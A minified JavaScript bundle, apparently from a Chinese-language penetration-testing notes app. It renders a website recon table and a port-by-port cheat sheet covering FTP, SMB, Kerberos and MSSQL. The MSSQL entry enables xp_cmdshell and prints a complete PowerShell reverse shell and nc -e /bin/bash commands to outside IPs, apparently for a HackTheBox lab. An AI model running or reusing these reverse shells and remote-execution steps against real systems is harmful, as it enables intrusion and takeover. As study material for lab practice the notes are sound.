(window.webpackJsonp=window.webpackJsonp||[]).push([[117],{"/4w9":function(w,U,t){"use strict";var z=t("2qtc"),y=t("kLXV"),p=t("+L6B"),e=t("2/Rp"),n=t("jrin"),r=t("k1fw"),g=t("tJVT"),E=t("q1tI"),s=t.n(E),i=t("ysNt"),k=t("7vea"),T=t.n(k),C=t("ozfa"),o=t("MJZm"),W=t("+BJd"),D=t("mr32"),v=t("fWQN"),x=t("mtLc"),J=t("Z5EX"),_=function(){function P(){Object(v.a)(this,P)}return Object(x.a)(P,null,[{key:"flat1",value:function(h){var c={};return h.forEach(function(f){var d=f.split("/").filter(function(l){return l!==""});return console.log("strs",d),d.reduce(function(l,a){return l[a]=l[a]||{},l[a]},c)}),c}},{key:"flat2arrangeIntoTree",value:function(h){for(var c=arguments.length>1&&arguments[1]!==void 0?arguments[1]:function(F){return F},f=[],d=0;d<h.length;d+=1)for(var l=h[d],a=f,m=0;m<l.length;m+=1){var R=l[m],H=G(a,"name",R);if(H)a=H.children;else{var M=c({name:R,children:[]},l.slice(0,m+1).join("/"));a.push(M),a=M.children}}return f;function G(F,X,N){for(var A=0;A<F.length&&F[A][X]!==N;)A+=1;return A<F.length?F[A]:!1}}},{key:"transformDirs",value:function(h){var c=arguments.length>1&&arguments[1]!==void 0?arguments[1]:P.fileSuffixMark,f=h.map(function(l){var a=l;return a.startsWith("/")&&(a="\u6839\u76EE\u5F55/".concat(a)),a.endsWith("/")||(a="".concat(a).concat(c)),a.split("/").filter(function(m){return m!==""})});console.log("paths",f);var d=P.flat2arrangeIntoTree(f,function(l,a){var m=l.name.endsWith(c);return Object(r.a)(Object(r.a)({},l),{},{title:m?s.a.createElement(s.a.Fragment,null,l.name.replace(c,""),s.a.createElement(D.a,{style:{marginLeft:"2em",whiteSpace:"pre"},color:J.a.\u5F00\u653E\u76EE\u5F55.color},c)):l.name,key:a,isLeaf:m})});return console.log("result",d),d}}]),P}();_.fileSuffixMark=" [ file ]",_.DirTree=function(P){var u=P.treeData,h=P.defaultExpandAll,c=h===void 0?!0:h,f=function(a,m){console.log("Trigger Select",a,m)},d=function(){console.log("Trigger Expand")};return s.a.createElement(o.a.DirectoryTree,{multiple:!0,defaultExpandAll:c,onSelect:f,onExpand:d,treeData:u})};var S=t("WHds"),b=t("kKgU"),B=t("6EgL"),I=b.a.list,Q=b.a.create,Y=b.a.update,Z=b.a.del,q=function(u){var h=u.projectList,c=u.hideFieldsSearch,f=u.listFilter,d=u.useStoreList,l=u.addReloadFn_toMap,a=u.hidePagination,m=u.hideToolbar,R=u.headerTitle,H=Object(E.useState)(!1),M=Object(g.a)(H,2),G=M[0],F=M[1],X=Object(E.useState)([]),N=Object(g.a)(X,2),A=N[0],tt=N[1];return s.a.createElement(s.a.Fragment,null," ",s.a.createElement(S.a,{addReloadFn_toMap:l,hideFieldsSearch:c,hidePagination:a,hideToolbar:m,headerTitle:R,handleList:function(O){if(d){var L=B.a.getStore().getState(),$=L.listAndserver.list;return console.log("\u4F7F\u7528state\u6570\u636E",L,$),Promise.resolve(Object(S.b)($))}else return console.log("\u4F7F\u7528\u63A5\u53E3\u62C9\u53D6\u6570\u636E"),I(O).then(function(K){return Object(S.b)(f?K.filter(f):K)})},handleAdd:Q,handleUpdate:Y,handleRemove:Z,columns:[{title:"\u552F\u4E00ID",dataIndex:"id",valueType:"text",fieldProps:Object(r.a)({},i.a.fieldProps.example("disabled"))},{title:"\u9879\u76EEID",dataIndex:"projectId",valueEnum:h.reduce(function(j,O){return Object(r.a)(Object(r.a)({},j),{},Object(n.a)({},O.id,{text:O.name,status:"Success"}))},{})},{title:"\u7F51\u7AD9\u76EE\u5F55\u7ED3\u6784",dataIndex:"siteDirs",valueType:"textarea",render:function(O,L,$,K,V){return s.a.createElement(s.a.Fragment,null,i.a.get_pRenderFn()(O,L,$,K,V),s.a.createElement(e.a,{className:T.a.dirOpenBtn,type:"primary",onClick:function(){var et=L[V.dataIndex];tt(_.transformDirs(et.split(`
`))),F(!0)}},"\u67E5\u770B\u76EE\u5F55"))},fieldProps:Object(r.a)({},i.a.fieldProps.example("autoSize_4_16"))},{title:"Admin\u7F51\u7AD9\u5165\u53E3",dataIndex:"adminSitePage",valueType:"textarea",render:i.a.get_pRenderFn(),fieldProps:Object(r.a)({},i.a.fieldProps.example("autoSize_4_16"))},{title:"Banner\u56FE\u7247\u76EE\u5F55",dataIndex:"bannerFiles",valueType:"textarea",render:i.a.get_pRenderFn(),fieldProps:Object(r.a)({},i.a.fieldProps.example("autoSize_4_16"))},{title:"\u7F51\u7AD9\u6B8B\u7559\uFF0C\u6D4B\u8BD5\u6587\u4EF6",dataIndex:"siteTestFiles",valueType:"textarea",render:i.a.get_pRenderFn(),fieldProps:Object(r.a)({},i.a.fieldProps.example("autoSize_4_16"))},{title:"\u7F51\u7AD9\u6B8B\u7559\uFF0C\u5907\u4EFD\u6587\u4EF6",dataIndex:"siteBakFiles",valueType:"textarea",render:i.a.get_pRenderFn(),fieldProps:Object(r.a)({},i.a.fieldProps.example("autoSize_4_16"))},{title:"\u521B\u5EFA\u65F6\u95F4",dataIndex:"createdAt",valueType:"dateTime",hideInForm:!0},{title:"\u66F4\u65B0\u65F6\u95F4",dataIndex:"updatedAt",valueType:"dateTime",hideInForm:!0}]}),s.a.createElement(y.a,{title:"\u6811\u72B6\u7ED3\u6784\u56FE",centered:!0,visible:G,onOk:function(){return F(!1)},onCancel:function(){return F(!1)},width:1e3},s.a.createElement("p",null,"\u7F51\u7AD9\u76EE\u5F55\u7ED3\u6784"),s.a.createElement(_.DirTree,{treeData:A})))},at=U.a=q},"7vea":function(w,U,t){w.exports={container:"container___2exrm",dirOpenBtn:"dirOpenBtn___3e3Tj"}},Z5EX:function(w,U,t){"use strict";t.d(U,"a",function(){return g}),t.d(U,"b",function(){return s});var z=t("fWQN"),y=t("mtLc"),p=t("q1tI"),e=t.n(p),n=t("ysNt"),r=n.a.singleATag_blank,g={\u5F00\u653E\u76EE\u5F55:{color:"#87d068",desc:"\u5F00\u653E\u76EE\u5F55\u3002\u4E00\u822C\u662F\u3010\u6742\u7269\u95F4\u3011\uFF0C\u53EF\u4EE5\u627E\u5230\u4E00\u4E9B\u610F\u5916\u7684\u60CA\u559C"},\u8FDC\u7A0B\u8FDE\u63A5\u767B\u5F55:{color:"#f50",desc:"\u8FDC\u7A0B\u8FDE\u63A5\u767B\u5F55\u3002\u63D0\u4F9B\u4E86\u4E00\u4E9B\u65B9\u5F0F\uFF0C\u53EF\u4EE5\u767B\u5F55\uFF0C\u7136\u540E\u8FDB\u884C\u63A7\u5236\u64CD\u4F5C"}},E=function(){function i(){Object(z.a)(this,i)}return Object(y.a)(i,null,[{key:"checkPortPairs",value:function(T){var C=this;T.forEach(function(o){var W=Array.isArray(o.port)?o.port:[o.port];C.pairs.forEach(function(D){W.forEach(function(v){D.ports.find(function(x){return x===v})&&(o.detail.relatedPorts=D)})})})}}]),i}();E.pairs=[{guess:["1.\u53EF\u80FD\u662F\u3010Domain Controller / \u57DF\u540D\u63A7\u5236\u5668\u3011\u3002",e.a.createElement(e.a.Fragment,null,"2.\u53EF\u4EE5\u8003\u8651\u4F7F\u7528\u3010BloodHound / \u5BFB\u8840\u730E\u72AC\u3011\u3002 \uFF08",r("\u57DF\u6E17\u900F\u5B9E\u6218\u8BE6\u7EC6\u4ECB\u7ECD","https://www.anquanke.com/post/id/230612"),"\uFF09"),"	1.\u53EF\u4EE5\u67E5\u51FA\u975E\u5E38\u591A\u7684\u6743\u9650\u3002\u9010\u6B65\u6DF1\u6316\u3002"],ports:[88,389,5985]},{guess:["\u548C\u3010SAMBA\u3011\u6709\u5173\u3002"],ports:[139,445]}];var s=[{port:[20,21],name:{cn:"FTP",fullForm:"File Transfer Protocol\uFF0C\u6587\u4EF6\u4F20\u8F93\u534F\u8BAE"},platformType:g.\u5F00\u653E\u76EE\u5F55,short:{service:"ftp",baseUsage:"\u7528\u4E8E\u5728\u4E3B\u673A\u4E4B\u95F4\uFF0C\u4F20\u8F93\u6587\u4EF6"},detail:{references:[e.a.createElement(e.a.Fragment,null,"\u7AEF\u53E3\u5229\u7528\uFF1A",r("21 - Pentesting FTP - HackTricks","https://book.hacktricks.xyz/pentesting/pentesting-ftp"))],detailUsage:["1. ftp <\u5730\u5740> \uFF0C\u7136\u540E\u8F93\u5165\u8D26\u53F7\u5BC6\u7801","	1.\u767B\u5F55\u6210\u529F\u540E\uFF0C\u5C31\u53EF\u4EE5\u6267\u884C\u547D\u4EE4\u4E86\u3002","	2.\u5E38\u89C1\u547D\u4EE4\uFF1A","		1.\u3010dir\u3011\uFF0C\u67E5\u770B\u5F53\u524D\u5217\u8868","		2.\u3010get <\u6587\u4EF6\u540D>\u3011\uFF0C\u4E0B\u8F7D\u6587\u4EF6",e.a.createElement(e.a.Fragment,null,"2. \u5168\u5C40\u67E5\u627E \uFF08",r("\u8D44\u65991","https://serverfault.com/questions/28568/using-the-find-command-on-the-ftp-server/437649"),"\uFF09"),"	1.\u53EF\u4EE5\u4F7F\u7528\u3010lftp\u3011\u5DE5\u5177\uFF0C\u6765\u8FDB\u884C\u8FDE\u63A5","		1.\u7136\u540E\uFF0C\u4F7F\u7528\u3010find . | grep WORD\u3011\u6307\u4EE4\u3002\uFF08\u548C\u5F80\u5E38\u5927\u4F53\u7C7B\u4F3C\uFF09","			1.\u7ECF\u8FC7\u6D4B\u8BD5\uFF0C\u786E\u5B9E\u6709\u7528\u3002"],weak:["1.\u53EF\u80FD\u5B58\u5728\u3010\u654F\u611F\u6587\u4EF6\u3011\u3001\u3010\u914D\u7F6E\u4FE1\u606F\u3011\u7684\u6CC4\u9732\u3002","2.\u3010anonymous\u3011\u533F\u540D\u767B\u5F55\u3002","	1.\u8D26\u53F7\u5BC6\u7801\u7686\u4E3A\u3010anonymous/anonymous\u3011\u3002"],relatedUtils:["1.\u914D\u5408 \u3010LFI\u3011\u6587\u4EF6\u5305\u542B \uFF0C\u6765\u8FDB\u884C\u4F7F\u7528\u3002","	1.\u5148\u4E0A\u4F20 reverse shell \uFF0C\u518D\u6267\u884C\u3002"]}},{port:22,name:{cn:"SSH",fullForm:"Secure Shell\uFF0C\u8FDC\u7A0B\u8FDE\u63A5"},platformType:g.\u8FDC\u7A0B\u8FDE\u63A5\u767B\u5F55,short:{service:"ssh\u547D\u4EE4",baseUsage:"\u7528\u4E8E\u8FDE\u63A5\u5230 \u8FDC\u7A0B\u7CFB\u7EDF\uFF0C\u5E76\u6267\u884C\u547D\u4EE4"},detail:{detailUsage:["1.\u3010\u5BC6\u7801\u8FDE\u63A5\u3011","2.\u3010\u79C1\u94A5\u6587\u4EF6\u8FDE\u63A5\u3011"],weak:["1.\u5BFB\u627E\u3010\u8D26\u53F7\u5BC6\u7801\u3011 \u6216 \u3010\u79C1\u94A5\u6587\u4EF6\u3011\uFF0C\u6765\u8FDB\u884C\u767B\u5F55\u3002"],relatedUtils:[]}},{port:23,name:{cn:"Telnet",fullForm:"\uFF1F"},short:{service:"\uFF1F\uFF1F",baseUsage:"\u7528\u4E8E\u8FDE\u63A5\u5230 \u8FDC\u7A0B\u7CFB\u7EDF\uFF0C\u5E76\u6267\u884C\u547D\u4EE4\u3002\uFF08\u7C7B\u4F3C\u4E8ESSH\uFF1F\uFF1F\uFF1F\uFF09"},detail:{detailUsage:[],weak:[],relatedUtils:[]}},{port:25,name:{cn:"SMTP",fullForm:"Simple Mail Transfer Protocol\uFF0C\u7B80\u5355\u90AE\u4EF6\u4F20\u8F93\u534F\u8BAE"},short:{service:"\uFF1F\uFF1F",baseUsage:"\u7528\u4E8E\u53D1\u9001\u7535\u5B50\u90AE\u4EF6\u3002"},detail:{detailUsage:[],weak:[],relatedUtils:[]}},{port:53,name:{cn:"DNS",fullForm:"Domain Name Service\uFF0C\u57DF\u540D\u670D\u52A1\u5668"},short:{service:"\uFF1F\uFF1F",baseUsage:"\u7528\u4E8E\u628A \u8BA1\u7B97\u673A\u540D\uFF0C\u8F6C\u6362\u4E3A IP\u5730\u5740\u3002"},detail:{detailUsage:[],weak:[],relatedUtils:[]}},{port:69,name:{cn:`\u4F7F\u7528\u3010UDP\u534F\u8BAE\u3011

TFTP`,fullForm:"Trivial File Transfer Protocol\uFF0C\u666E\u901A\u6587\u4EF6\u4F20\u8F93\u534F\u8BAE"},short:{service:"tftp  <ip\u5730\u5740> ",baseUsage:"\u662F\u3010FTP\u3011\u7684\u7B80\u5316\u7248\u672C\u3002\u66F4\u7B80\u5355\uFF0C\u4F7F\u7528UDP\u534F\u8BAE\u3002\u4E0D\u591F\u5B89\u5168\u3002"},detail:{detailUsage:["1.\u9700\u8981\u5B89\u88C5\u3010 sudo apt-get install tftp \u3011\u3002","2.\u5E38\u89C1\u6307\u4EE4\uFF1A","	1.\u3010put <\u6587\u4EF6\u540D>\u3011\uFF0C\u4E0A\u4F20\u6587\u4EF6","	2.\u3010get <\u6587\u4EF6\u540D>\u3011\uFF0C\u4E0B\u8F7D\u6587\u4EF6","3.\u9ED8\u8BA4\u76EE\u5F55\u8DEF\u5F84","	1.\u4E00\u822C\u662F\u3010/var/lib/tftpboot\u3011\u3002\u53EF\u4EE5\u4ECE\u8FD9\u70B9\u5165\u624B","		1.\u7ED3\u5408\u3010LFI\u3011\u6587\u4EF6\u5305\u542B \uFF0C\u7B49\u7B49"],weak:[],relatedUtils:["1.\u65B9\u6848\u4E00\uFF1A\u5F88\u591A\u65F6\u5019\uFF0C\u53EF\u4EE5\u548C \u3010LFL/\u672C\u5730\u6587\u4EF6\u5305\u542B\u3011 \u653B\u51FB\uFF0C\u7ED3\u5408\u4E00\u8D77\u4F7F\u7528\u3002"]}},{port:80,name:{cn:"HTTP\u7F51\u9875\u7AEF\u53E3",fullForm:"HyperText Transfer Protocol"},platformType:g.\u5F00\u653E\u76EE\u5F55,short:{service:"Apache\u3001Nginx\u3001Tomcat\uFF0C\u7B49\u7B49",baseUsage:"\u7528\u4E8E\u8BBF\u95EE Web\u670D\u52A1\u5668\uFF0C\u7528\u6765\u8BBF\u95EE\u7F51\u9875\u3002"},detail:{detailUsage:[],weak:[],relatedUtils:["1.\u6253\u5F00BurpSuite","	1.\u68C0\u67E5\u3010\u6574\u4F53\u7ED3\u6784\u3011","	2.\u6536\u96C6\u3010\u591A\u79CD\u63A5\u53E3\u4FE1\u606F\u3011","2.\u8FDB\u5165\u7F51\u9875\uFF0C\u67E5\u770B\uFF1A","	1.\u6536\u96C6\u3010\u4E1A\u52A1\u903B\u8F91\u3011\u3001\u3010\u6574\u4F53\u6D41\u7A0B\u3011","		1.\u7EAF\u624B\u52A8","	2.\u6536\u96C6\u654F\u611F\u4FE1\u606F","		1.\u90E8\u5206\u81EA\u52A8\uFF1A","			1.\u641C\u7D22 admin pass login upload user email","				1.\u6B63\u5219  (admin|pass|login|upload|user|email)","	3.\u6536\u96C6\u5404\u79CD\u5165\u53E3","		1.\u90E8\u5206\u81EA\u52A8\uFF1A","			1.\u641C\u7D22\u3010<a\u3011 \u6807\u7B7E\u5934","				1.\u6B63\u5219  (<a)","	4.\u67E5\u770B\u4EE3\u7801\uFF0C\u76F8\u5173\u6CE8\u91CA\u3002","		1.\u90E8\u5206\u81EA\u52A8\uFF1A","			1.\u641C\u7D22\u3010<!\u3011 \u6CE8\u91CA\u5934","				1.\u6B63\u5219  (<!)","	5.\u67E5\u627E\u8F93\u5165\u6846\u3001\u6309\u94AE \uFF08\u53EF\u80FD\u548C\u63A5\u53E3 \u6709\u5173\uFF09","		1.\u90E8\u5206\u81EA\u52A8\uFF1A","			1.\u641C\u7D22\u3010<button\u3011\u3001\u3010<input\u3011\u3001\u3010<form\u3011 \u6807\u7B7E\u5934","				1.\u6B63\u5219  (<button|<input|<form)","	6.\u91CD\u70B9js\u4EE3\u7801\uFF0C\u5BA1\u67E5","		1.\u7EAF\u624B\u52A8\uFF1A","			1.\u6BD4\u5982 index.js main.js entry.js ","3.\u626B\u63CF\u7F51\u7AD9\u76EE\u5F55","	1.\u4F18\u5148\u3010gobuster\u3011"]}},{port:88,name:{cn:"Kerberos",fullForm:"Kerberos"},short:{service:"\uFF1F\uFF1F",baseUsage:"\u4E00\u79CD\u7F51\u7EDC\u8EAB\u4EFD\u9A8C\u8BC1\u534F\u8BAE\u3002\uFF1F\uFF1F"},detail:{detailUsage:["1.\u975E\u5E38\u503C\u5F97\u68C0\u67E5 Kerberos \u7684\u3010pre-authentication\u3011\uFF0C\u662F\u5426\u88AB\u7981\u7528\uFF1F","	1.\u4E00\u65E6\u88AB\u7981\u7528\uFF0C\u4F60\u5C31\u4E2D\u5956\u4E86\uFF01","		1.\u76F4\u63A5\u5F00\u542F\u3010ASREPRoasting\u3011\u653B\u51FB\uFF0C\u53EF\u4EE5\u9A6C\u4E0A\u62FF\u4E0B","	2.\u4F7F\u7528\u3010\u3011"],weak:[],relatedUtils:[]}},{port:110,name:{cn:"POP3",fullForm:"Post Office Protocol\uFF0C\u90AE\u5C40\u534F\u8BAE"},short:{service:"\uFF1F\uFF1F",baseUsage:"\u7528\u4E8E\u63A5\u6536\u7535\u5B50\u90AE\u4EF6\u3002"},detail:{detailUsage:[],weak:[],relatedUtils:[]}},{port:113,name:{cn:"",fullForm:""},short:{service:"",baseUsage:""},detail:{detailUsage:[],weak:[],relatedUtils:[]}},{port:123,name:{cn:"NTP",fullForm:"Network Time Protocol\uFF0C\u7F51\u7EDC\u65F6\u95F4\u534F\u8BAE"},short:{service:"\uFF1F\uFF1F",baseUsage:"\u7528\u4E8E\u540C\u6B65\u7CFB\u7EDF\u65F6\u95F4\u3002"},detail:{detailUsage:[],weak:[],relatedUtils:[]}},{port:135,name:{cn:"",fullForm:""},short:{service:"",baseUsage:""},detail:{detailUsage:[],weak:[],relatedUtils:[]}},{port:139,name:{cn:"NETBIOS",fullForm:"Network Basic Input/Output System\uFF0C\u7F51\u7EDC\u57FA\u672C\u8F93\u5165\u8F93\u51FA\u7CFB\u7EDF"},short:{service:["SAMBA\u76F8\u5173","\u2026\u2026\u2026\u2026"],baseUsage:"\u3010\u57FA\u4E8EIP\u7684NBT\u3011\uFF0C\u7528\u4E8E\u5C40\u57DF\u7F51\u901A\u4FE1\u3002"},detail:{detailUsage:[],weak:[],relatedUtils:[]}},{port:143,name:{cn:"IMAP",fullForm:"Internet Message Access Protocol\uFF0C\u56E0\u7279\u7F51\u90AE\u4EF6\u8BBF\u95EE\u534F\u8BAE"},short:{service:"",baseUsage:"\u7528\u4E8E\u63A5\u6536\u7535\u5B50\u90AE\u4EF6\u3002"},detail:{detailUsage:[],weak:[],relatedUtils:[]}},{port:[161,162],name:{cn:"SNMP",fullForm:"Simple Network Management Protocol\uFF0C\u7B80\u5355\u7F51\u7EDC\u7BA1\u7406\u534F\u8BAE"},short:{service:"",baseUsage:"\u7528\u4E8E\u6536\u96C6\u7F51\u7EDC\u8BBE\u5907\u7684\u4FE1\u606F\u3002"},detail:{detailUsage:[],weak:[],relatedUtils:[]}},{port:389,name:{cn:"LDAP",fullForm:"Lightweight Directory Access Protocol\uFF0C\u8F7B\u91CF\u7EA7\u76EE\u5F55\u8BBF\u95EE\u534F\u8BAE"},short:{service:"\uFF1F\uFF1F",baseUsage:"\u7528\u4E8E\u63D0\u4F9B\u4E00\u4E9B\u7F51\u7EDC\u76F8\u5173\u7684\u4FE1\u606F\uFF0C\u4F8B\u5982\u7F51\u7EDC\u8D26\u6237\u7684\u4FE1\u606F\u3002\u7EF4\u62A4\u5206\u5E03\u5F0F\u76EE\u5F55\u4FE1\u606F\u3002"},detail:{detailUsage:[],weak:[],relatedUtils:[]}},{port:443,name:{cn:"",fullForm:""},platformType:g.\u5F00\u653E\u76EE\u5F55,short:{service:"",baseUsage:"\u7528\u4E8E\u5728 \u52A0\u5BC6\u7684\u8FDE\u63A5\u4E0A\uFF0C\u8BBF\u95EE\u3010Web\u670D\u52A1\u5668\u3011\u3002"},detail:{detailUsage:[],weak:[],relatedUtils:[]}},{port:445,name:{cn:"SMB\u670D\u52A1",fullForm:"ServerMessageBlock\u670D\u52A1\u6D88\u606F\u5757"},platformType:g.\u5F00\u653E\u76EE\u5F55,short:{service:["SAMBA\u76F8\u5173","microsoft-ds"],baseUsage:"\u3010\u57FA\u4E8EIP\u7684SMB\u3011\uFF0C\u5728 Linux\u3001Windows \u4E2D\uFF0C\u7528\u4E8ESMB\u6587\u4EF6\u5171\u4EAB"},detail:{detailUsage:[],weak:["1.\u53EF\u80FD\u5141\u8BB8\u533F\u540D\u8BBF\u95EE","2.\u800C\u3010\u5171\u4EAB\u6587\u4EF6\u3011\uFF0C\u7ECF\u5E38\u5B58\u50A8\u7740 \u542B\u6709\u5BC6\u7801\u3001\u5176\u5B83\u654F\u611F\u4FE1\u606F \u7684\u914D\u7F6E\u6587\u4EF6","3."],relatedUtils:["\u68C0\u6D4B\u7248\u672C","	1.\u3010msf > use _auxiliary/scanner/smb/smb_version\u3011","		1.\u68C0\u6D4B\u51FA\u7ED3\u679C\u3002",e.a.createElement(e.a.Fragment,null,"\u3010\u67E5\u770B\u5171\u4EAB\u3011smbclient -N -L \\\\\\\\","<IP\u5730\u5740>","\\\\"),"	1.\u7279\u522B\u6CE8\u610F\uFF1A","		1.\u3010IP\u5730\u5740\u3011\u548C\u3010\u53CD\u659C\u6760\u3011\u4E2D\u95F4\u6CA1\u6709\u7A7A\u683C\u3002"," ",e.a.createElement(e.a.Fragment,null,"\u3010\u67E5\u770B\u5171\u4EAB\u3011smbclient -N \\\\\\\\","<IP\u5730\u5740>","\\\\","<\u5206\u4EAB\u540D>"),"	1.\u7279\u522B\u6CE8\u610F\uFF1A","		1.\u3010IP\u5730\u5740\u3011\u548C\u3010\u53CD\u659C\u6760\u3011\u4E2D\u95F4\u6CA1\u6709\u7A7A\u683C\u3002","	\u8FDB\u5165\u3010\u64CD\u4F5C\u6A21\u5F0F\u3011","	dir","		\u67E5\u770B\u5F53\u524D\u76EE\u5F55 \u6587\u4EF6\u5217\u8868","	get <\u6587\u4EF6\u540D>","		\u4E0B\u8F7D\u6587\u4EF6\uFF0C\u9ED8\u8BA4\u662F\u3010\u8FDB\u5165smb\u524D\u3011\u7684\u5F53\u524D\u76EE\u5F55\u3002"]}},{port:465,name:{cn:"SMTPS",fullForm:"Simple Mail Transfer Protocol Secure\uFF0C\u7B80\u5355\u90AE\u4EF6\u4F20\u8F93\u3010\u5B89\u5168\u3011\u534F\u8BAE"},short:{service:"",baseUsage:"\u7528\u4E8E\u53D1\u9001\u52A0\u5BC6\u7535\u5B50\u90AE\u4EF6\u3002"},detail:{detailUsage:[],weak:[],relatedUtils:[]}},{port:514,name:{cn:"Syslog",fullForm:"System Log\uFF0C\u7CFB\u7EDF\u65E5\u5FD7"},short:{service:"",baseUsage:"\u7528\u4E8E\u628A\u7CFB\u7EDF\u65E5\u5FD7\u53D1\u9001\u5230\u8FDC\u7A0B\u4E3B\u673A\u4E0A\u3002"},detail:{detailUsage:[],weak:[],relatedUtils:[]}},{port:636,name:{cn:"LDAPS",fullForm:"Lightweight Directory Access Protocol Secure\uFF0C\u8F7B\u91CF\u7EA7\u76EE\u5F55\u8BBF\u95EE\u3010\u5B89\u5168\u3011\u534F\u8BAE"},short:{service:"",baseUsage:"\u7528\u4E8E\u901A\u8FC7 \u52A0\u5BC6\u7684\u8FDE\u63A5 \u4F7F\u7528\u3010LDAP\u3011\u534F\u8BAE\u3002"},detail:{detailUsage:[],weak:[],relatedUtils:[]}},{port:993,name:{cn:"IMAPS",fullForm:"Internet Message Access Protocol Secure\uFF0C\u56E0\u7279\u7F51\u90AE\u4EF6\u8BBF\u95EE\u3010\u5B89\u5168\u3011\u534F\u8BAE"},short:{service:"",baseUsage:"\u7528\u4E8E\u901A\u8FC7 \u52A0\u5BC6\u7684\u8FDE\u63A5 \uFF0C\u4F7F\u7528\u3010IMAP\u3011\u534F\u8BAE\u3002"},detail:{detailUsage:[],weak:[],relatedUtils:[]}},{port:995,name:{cn:"POP3S",fullForm:"Post Office Protocol Secure\uFF0C\u90AE\u5C40\u3010\u5B89\u5168\u3011\u534F\u8BAE"},short:{service:"",baseUsage:"\u7528\u4E8E\u5728 \u52A0\u5BC6\u7684\u8FDE\u63A5 \u4E0A\uFF0C\u4F7F\u7528\u3010POP3\u3011\u534F\u8BAE\u3002"},detail:{detailUsage:[],weak:[],relatedUtils:[]}},{port:1433,name:{cn:"mssql",fullForm:"Microsoft SQL Server \u5FAE\u8F6FSQL\u670D\u52A1\u5668"},platformType:g.\u8FDC\u7A0B\u8FDE\u63A5\u767B\u5F55,short:{service:"ms-sql-s",baseUsage:"\u5FAE\u8F6F\u81EA\u5BB6\u7684SQL\u670D\u52A1\u5668"},detail:{detailUsage:[],weak:["\u8FDC\u7A0B\u8FDE\u63A5\u540E\uFF0C\u53EF\u4F7F\u7528SQL\u6240\u5728\u7528\u6237\uFF0C\u6267\u884CWindows\u547D\u4EE4"],relatedUtils:[e.a.createElement(e.a.Fragment,null,"Impacket - mssqlclient.py \uFF08",r("\u5B98\u65B9\u8D44\u6599","https://github.com/SecureAuthCorp/impacket"),"\uFF09"),"	\u5B89\u88C5\u65B9\u5F0F\uFF1A","		1.\u4E0B\u8F7D\u538B\u7F29\u5305\uFF0C\u6216GitHub\u4ED3\u5E93\u6E90\u7801\uFF1A","			1.\u65B9\u5F0F\u4E00\uFF1A\u4E0B\u8F7D\u3010Release\u3011\u538B\u7F29\u5305\uFF0C\u89E3\u538B\u7F29\u3002","			2.\u65B9\u5F0F\u4E8C\uFF1A\u4E0B\u8F7DGitHub\u4ED3\u5E93\uFF0C\u3010git clone https://github.com/SecureAuthCorp/impacket.git\u3011","		2.\u6267\u884C\u3010pip3 install . \u3011\uFF0C\u5B89\u88C5\u5FC5\u9700\u4F9D\u8D56\u3002","	\u6267\u884C\u65B9\u5F0F\uFF1A","		python3 ./examples/mssqlclient.py sql_svc@10.10.10.27 -windows-auth","			\u5E94\u8BE5\u4F7F\u7528\u3010sql_svc@10.10.10.27\u3011\uFF0C\u800C\u4E0D\u662F\u3010ARCHETYPE/sql_svc@10.10.10.27\u3011",e.a.createElement(e.a.Fragment,null,"				","\u4E0D\u7136\u4F1A\u62A5\u9519\u3010Login failed for user 'ARCHETYPE\\Guest'\u3011\u3002\uFF08",r("\u94FE\u63A51","https://forum.hackthebox.eu/discussion/comment/72514/#Comment_72514"),"\u3001",r("\u94FE\u63A52","https://github.com/SecureAuthCorp/impacket/issues/613"),"\uFF09"),"		SELECT IS_SRVROLEMEMBER('sysadmin')","			\u67E5\u770B\u662F\u5426\u3010\u7CFB\u7EDF\u7BA1\u7406\u5458\u3011",`		
        EXEC sp_configure 'Show Advanced Options', 1;
        reconfigure;
        sp_configure;
        EXEC sp_configure 'xp_cmdshell', 1
        reconfigure;
        xp_cmdshell "whoami"
        `,"			\u3010EXEC sp_configure <\u952E> <\u503C>\u3011 \u66F4\u6539\u8BBE\u7F6E","			\u3010reconfigure\u3011 \u91CD\u65B0\u52A0\u8F7D\u8BBE\u7F6E\uFF0C\u4EE5\u751F\u6548","			\u3010sp_configure\u3011 \u67E5\u770B\u8BBE\u7F6E","			\u3010xp_cmdshell <\u547D\u4EE4>\u3011 RCE\u8FDC\u7A0B\u6267\u884C\u547D\u4EE4","		\u653E\u7F6E\u3010Windows Shell\u3011\u6587\u4EF6","			\u811A\u672C\u5185\u5BB9\uFF1A",'				$client = New-Object System.Net.Sockets.TCPClient("10.10.14.3",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()',"			\u67B6\u8BBE\u65B9\u5F0F\u4E00\uFF1A\u672C\u5730Python\u67B6\u8BBE","			\u67B6\u8BBE\u65B9\u5F0F\u4E8C\uFF1A\u516C\u7F51\u670D\u52A1\u5668\u67B6\u8BBE","		\u4F7F\u7528NC\u53CD\u5411\u8FDE\u63A5","			\u6D4B\u8BD5\u8FDE\u901A\u6027\uFF1A","				\u672A\u5F00\u542F\u3010nc\u76D1\u542C\u3011\uFF1A","					\u3010nc 104.198.9.12 20443\u3011\uFF0CConnection timed out","					\u3010nc 104.198.9.12 20443 -e /bin/bash\u3011\uFF0CConnection timed out","				\u5DF2\u5F00\u542F\u3010nc\u76D1\u542C\u3011","					\u3010nc 104.198.9.12 20443\u3011\uFF0CConnection refused","					\u3010nc 104.198.9.12 20443 -e /bin/bash\u3011\uFF0CConnection refused","				\u6B64\u65F6\uFF0C\u9700\u8981\uFF1A","					","			\u6700\u540E\u6307\u4EE4\uFF1Anc -lvnp 443","			FAQ\uFF1A","				\u3010nc -lvnp 443\u3011\uFF0C\u65E0\u6CD5\u63A5\u53D7\u5230\u4EFB\u4F55\u4FE1\u53F7\uFF1F","					1.\u5C1D\u8BD5\u65B9\u6848\u4E00\uFF1A\u8BBE\u7F6E\u3010ufw\u3011\u9632\u706B\u5899","					2.\u5C1D\u8BD5\u65B9\u6848\u4E8C\uFF1A\u8BBE\u7F6E\u3010firewalld\u3011\u9632\u706B\u5899","					3.\u5C1D\u8BD5\u65B9\u6848\u4E09\uFF1A\u8BBE\u7F6E\u3010\u5E73\u53F0\u9632\u706B\u5899\u3011","					4.\u6700\u7EC8\u6210\u529F\u65B9\u6848\u4E00\uFF1A\u3010CentOS\u3011\u4E0D\u884C\uFF0C\u3010Ubuntu\u3011\u884C\u3002","			